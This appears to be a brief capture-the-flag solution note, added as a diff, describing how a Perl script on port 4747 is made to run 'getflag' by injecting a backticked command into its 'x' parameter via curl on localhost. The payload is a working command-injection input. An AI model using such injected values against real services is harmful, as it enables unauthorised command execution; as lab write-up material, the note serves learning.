@@ -1,0 +1,6 @@
+script pearl running on port 4747, print param 'x'
+script has right to exec getflag
+->curl 127.0.0.1:4747?x=test
+test
+->curl 127.0.0.1:4747?x=\`getflag\`
+flag
